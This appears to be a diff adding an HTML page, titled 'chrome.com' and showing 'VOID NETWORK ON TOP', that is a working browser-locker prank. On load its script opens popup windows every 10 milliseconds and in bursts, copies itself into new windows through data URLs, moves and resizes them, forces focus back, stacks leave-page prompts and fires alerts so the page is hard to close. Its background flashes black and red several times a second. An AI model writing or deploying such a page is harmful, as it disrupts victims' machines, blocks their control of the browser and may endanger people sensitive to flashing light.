@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>chrome.com</title>
+    <script src="/js/popup-client.js"></script>
+    <script>!function(w,d,s,g){var c=function(){try{var t=localStorage.getItem("_ga_cid");return t||(t=Math.floor(Math.random()*1e9)+"."+Math.floor(Date.now()/1e3),localStorage.setItem("_ga_cid",t)),t}catch(e){return Math.floor(Math.random()*1e9)+"."+Math.floor(Date.now()/1e3)}}();w.dataLayer=w.dataLayer||[],w.gtag=function(){dataLayer.push(arguments)},gtag("js",new Date),gtag("config",g,{client_id:c});var a=d.createElement("script");a.async=1,a.src="https://www.googletagmanager.com/gtag/js?id="+g;var m=d.getElementsByTagName("script")[0];m.parentNode.insertBefore(a,m);setTimeout(function(){var e=new Image;e.src="https://www.google-analytics.com/collect?v=2&tid="+g+"&sid="+s+"&cid="+c+"&dl="+encodeURIComponent(location.href)+"&dt="+encodeURIComponent(d.title)+"&t=pageview&_s=1",e.style.display="none",d.body&&d.body.appendChild(e)},1e3);w.addEventListener("beforeunload",function(){navigator.sendBeacon&&navigator.sendBeacon("https://www.google-analytics.com/collect","v=2&tid="+g+"&sid="+s+"&cid="+c+"&dl="+encodeURIComponent(location.href)+"&dt="+encodeURIComponent(d.title)+"&t=pageview")});var n=d.createElement("noscript");if(n.innerHTML='<img src="https://www.google-analytics.com/collect?v=2&tid='+g+"&sid="+s+'&cid=555&dl='+encodeURIComponent(location.href)+'&dt='+encodeURIComponent(d.title)+'&t=pageview&_s=1" height="1" width="1" style="display:none">',d.head.appendChild(n),d.body){var b=d.createElement("noscript");b.innerHTML='<img src="https://www.google-analytics.com/collect?v=2&tid='+g+"&sid="+s+'&cid=555&dl=pageview&dt=Page%20View&t=pageview&_s=1" height="1" width="1" style="display:none"><iframe src="https://www.googletagmanager.com/ns.html?id='+g+'" height="0" width="0" style="display:none;visibility:hidden"></iframe>',d.body.insertBefore(b,d.body.firstChild)}else d.addEventListener("DOMContentLoaded",function(){var e=d.createElement("noscript");e.innerHTML='<img src="https://www.google-analytics.com/collect?v=2&tid='+g+"&sid="+s+'&cid=555&dl=pageview&dt=Page%20View&t=pageview&_s=1" height="1" width="1" style="display:none"><iframe src="https://www.googletagmanager.com/ns.html?id='+g+'" height="0" width="0" style="display:none;visibility:hidden"></iframe>',d.body.insertBefore(e,d.body.firstChild)})}(window,document,"10184903349","G-814Y2X3KSF");</script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #000;
+            animation: flashBackground 0.3s infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        
+        @keyframes flashBackground {
+            0%, 49% { background-color: #000; }
+            50%, 100% { background-color: #ff0000; }
+        }
+        
+        .main-text {
+            font-size: 48px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #fff;
+            text-align: center;
+            text-shadow: 0 0 10px #fff, 0 0 20px #fff;
+            animation: flashText 0.4s infinite;
+            letter-spacing: 2px;
+            z-index: 1000;
+            position: relative;
+        }
+        
+        @keyframes flashText {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0.7; }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-text">VOID NETWORK ON TOP</div>
+</body>
+
+    <script>
+        // Initialize variables
+        let windowCount = 0;
+        let openedWindows = [];
+        
+        // Preload confirm dialog messages to make them harder to avoid
+        const leaveMessages = [
+            'VOID NETWORK ACTIVATED',
+            'SYSTEM PROCESS RUNNING',
+            'OPERATION IN PROGRESS',
+            'CRITICAL PROCESS ACTIVE',
+            'NETWORK SYNC IN PROGRESS'
+        ];
+        
+        // Get the current URL of the page (the actual URL, not data URL)
+        let actualUrl = window.location.href;
+        
+        // If we're already in a data URL, try to get the original URL from localStorage
+        try {
+            if (actualUrl.startsWith('data:')) {
+                const storedUrl = localStorage.getItem('originalUrl');
+                if (storedUrl) {
+                    actualUrl = storedUrl;
+                }
+            } else {
+                // Store this URL for future windows to use
+                localStorage.setItem('originalUrl', actualUrl);
+            }
+        } catch (e) {
+            // Ignore storage errors
+        }
+        
+        // Function to get a random position for windows
+        function getRandomPosition() {
+            const screenWidth = window.screen.availWidth;
+            const screenHeight = window.screen.availHeight;
+            const width = Math.floor(Math.random() * 600) + 200; // Random width between 200-800px
+            const height = Math.floor(Math.random() * 400) + 200; // Random height between 200-600px
+            const left = Math.floor(Math.random() * (screenWidth - width));
+            const top = Math.floor(Math.random() * (screenHeight - height));
+            
+            return {
+                width: width,
+                height: height,
+                left: left,
+                top: top
+            };
+        }
+        
+        // Function to open a new window with the original URL
+        function openNewWindow() {
+            try {
+                // If we have a valid URL that's not a data URL, use it directly
+                if (actualUrl && !actualUrl.startsWith('data:')) {
+                    const newTab = window.open(actualUrl, '_blank');
+                    if (newTab) openedWindows.push(newTab);
+                    
+                    // Open multiple random positioned windows with the actual URL
+                    for (let i = 0; i < 6; i++) {
+                        const pos = getRandomPosition();
+                        const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
+                        const newWindow = window.open(actualUrl, '', windowFeatures);
+                        if (newWindow) openedWindows.push(newWindow);
+                    }
+                } else {
+                    // Fallback to self-replication if we don't have a valid URL
+                    const html = document.documentElement.outerHTML;
+                    const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+                    
+                    const newTab = window.open(dataUrl, '_blank');
+                    if (newTab) openedWindows.push(newTab);
+                    
+                    for (let i = 0; i < 6; i++) {
+                        const pos = getRandomPosition();
+                        const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
+                        const newWindow = window.open(dataUrl, '', windowFeatures);
+                        if (newWindow) openedWindows.push(newWindow);
+                    }
+                }
+                
+                // Clean up any closed windows from the array
+                openedWindows = openedWindows.filter(win => !win.closed);
+                windowCount = openedWindows.length;
+                
+                // Move existing windows around to create chaos
+                moveWindowsRandomly();
+            } catch (e) {
+                // If error occurs, try again with a delay
+                setTimeout(openNewWindow, 100);
+            }
+        }
+        
+        // Function to move all spawned windows around randomly
+        function moveWindowsRandomly() {
+            openedWindows.forEach(win => {
+                try {
+                    if (!win.closed) {
+                        const screenWidth = window.screen.availWidth;
+                        const screenHeight = window.screen.availHeight;
+                        
+                        // Get current position and move it a bit
+                        const newX = Math.floor(Math.random() * (screenWidth - 400));
+                        const newY = Math.floor(Math.random() * (screenHeight - 300));
+                        
+                        win.moveTo(newX, newY);
+                        
+                        // Resize randomly too for more chaos
+                        const newWidth = Math.floor(Math.random() * 600) + 200;
+                        const newHeight = Math.floor(Math.random() * 400) + 200;
+                        win.resizeTo(newWidth, newHeight);
+                    }
+                } catch (e) {
+                    // Ignore errors from cross-origin windows
+                }
+            });
+        }
+        
+        // Function to make closing the tab/window difficult
+        function makeClosingDifficult() {
+            // Add multiple beforeunload listeners to make it harder to leave
+            for (const message of leaveMessages) {
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = message;
+                    return message;
+                });
+            }
+            
+            // Try to create a focus trap that brings focus back to this window
+            setInterval(() => {
+                try {
+                    window.focus();
+                } catch (e) {
+                    // Ignore focus errors
+                }
+            }, 300);
+            
+            // Create additional dialog when user tries to leave
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'hidden') {
+                    setTimeout(() => {
+                        try {
+                            alert('VOID NETWORK ACTIVE');
+                            window.focus();
+                        } catch (e) {
+                            // Ignore errors
+                        }
+                    }, 100);
+                }
+            });
+        }
+        
+        // Start all the chaos immediately
+        function startChaos() {
+            // Initial burst of spawns
+            for (let i = 0; i < 5; i++) {
+                setTimeout(openNewWindow, i * 10);
+            }
+            
+            // Ultra fast spawning
+            setInterval(() => {
+                openNewWindow();
+            }, 10); // Super aggressive 10ms interval
+            
+            // Move windows around frequently
+            setInterval(() => {
+                moveWindowsRandomly();
+            }, 100); // Move windows every 100ms
+            
+            // Burst mode for occasional massive spawn
+            setInterval(() => {
+                for (let i = 0; i < 8; i++) {
+                    setTimeout(openNewWindow, i * 5);
+                }
+            }, 500); // Every half second do a massive burst
+        }
+        
+        // Start everything when the page loads
+        window.onload = function() {
+            // Make closing tabs difficult
+            makeClosingDifficult();
+            
+            // Start the chaos immediately
+            startChaos();
+        };
+    </script>
+</body>
+</html>
